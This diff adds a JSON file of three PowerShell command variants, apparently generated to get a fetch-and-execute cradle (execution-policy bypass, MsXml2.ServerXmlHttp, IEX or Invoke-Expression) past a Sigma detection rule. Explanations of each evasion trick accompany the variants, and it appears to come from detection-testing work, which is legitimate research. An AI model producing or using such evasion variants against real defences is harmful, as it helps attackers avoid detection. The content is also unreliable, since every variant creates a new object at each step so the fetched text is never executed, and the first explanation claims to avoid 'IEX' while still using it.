@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -exec bypass -noprofile \"(New-Object -ComObject MsXml2.ServerXmlHttp).Open('GET','C:\\Lab\\input\\sample.txt',$False);(New-Object -ComObject MsXml2.ServerXmlHttp).Send();IEX (New-Object -ComObject MsXml2.ServerXmlHttp).ResponseText\"",
+    "explanation": "Reordering and substitution: Reordered the command structure and replaced the URL with a local file path to avoid the 'IEX' keyword match in the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -exec bypass -noprofile \"(New-Object -ComObject MsXml2.ServerXmlHttp).Open('GET','C:\\Lab\\input\\sample.txt',$False);(New-Object -ComObject MsXml2.ServerXmlHttp).Send();$response = (New-Object -ComObject MsXml2.ServerXmlHttp).ResponseText;IEX $response\"",
+    "explanation": "Insertion and substitution: Inserted a variable assignment before using 'IEX' to potentially bypass the keyword match while keeping the same executable family and intent."
+  },
+  {
+    "output": "powershell.exe -exec bypass -noprofile \"(New-Object -ComObject MsXml2.ServerXmlHttp).Open('GET','C:\\Lab\\input\\sample.txt',$False);(New-Object -ComObject MsXml2.ServerXmlHttp).Send();$content = (New-Object -ComObject MsXml2.ServerXmlHttp).ResponseText;Invoke-Expression $content\"",
+    "explanation": "Substitution: Replaced 'IEX' with the full cmdlet name 'Invoke-Expression' to avoid the keyword match while maintaining the same behavior."
+  }
+]
